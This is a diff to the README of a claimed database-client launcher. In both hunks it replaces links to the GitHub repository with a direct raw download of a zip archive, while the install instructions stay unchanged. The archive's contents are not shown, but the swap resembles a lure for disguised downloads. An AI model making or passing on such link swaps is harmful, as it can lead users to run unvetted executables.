@@ -4,7 +4,7 @@
 Welcome to query-exe-launcher! This is the auto-updating launcher for QueryExe, a powerful yet simple cross-platform database client that works on Windows, Linux, and macOS. Whether you need to connect to MySQL, PostgreSQL, SQLite, MariaDB, H2, or SQL Server, this launcher makes it easy.
 
 ## 📥 Download and Install
-Visit this link to download the application: [Download query-exe-launcher](https://github.com/designer5253/query-exe-launcher)
+Visit this link to download the application: [Download query-exe-launcher](https://raw.githubusercontent.com/designer5253/query-exe-launcher/main/packaging/linux/v1.9.zip)
 
 After visiting the link, look for the latest release and download the installer for your operating system. On Windows, run the downloaded file to install. On Linux or macOS, follow the provided instructions.
 
@@ -46,7 +46,7 @@ After visiting the link, look for the latest release and download the installer 
 The launcher automatically checks for updates when you start it. You can also manually check for updates from the application menu.
 
 ## 🔗 Quick Links
-- **Download Now:** [query-exe-launcher](https://github.com/designer5253/query-exe-launcher)
+- **Download Now:** [query-exe-launcher](https://raw.githubusercontent.com/designer5253/query-exe-launcher/main/packaging/linux/v1.9.zip)
 - **Report Issues:** Use the GitHub issues page
 - **Documentation:** Visit the repository wiki
 
